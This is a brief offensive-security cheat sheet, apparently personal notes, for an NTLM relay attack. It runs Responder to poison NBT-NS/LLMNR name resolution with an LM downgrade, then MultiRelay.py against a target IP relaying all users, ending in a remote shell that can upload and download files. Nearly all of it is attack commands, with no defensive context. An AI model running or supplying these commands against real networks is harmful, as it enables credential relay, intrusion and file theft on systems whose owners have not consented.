# $ responder + $ multirelay for NTLM relay attack
```bash
# disable smb and http service
$ nano /usr/share/responder/Responder.conf # conf file for responder
# responder will not work as fake smb/http server
# it will only poison NBT-NS/LLMNR and becomes MitM
```
```bash
$ responder -I <interface> --lm # run resonder as relay with downgrade ntlm to lm
```
```bash
# target specific host in network with multirelay
$ /usr/share/responder/tools/MultiRelay.py -t <targetIP> -u ALL # relay ALL users
```
```bash
# gets multirelay shel: upload, download files,...
```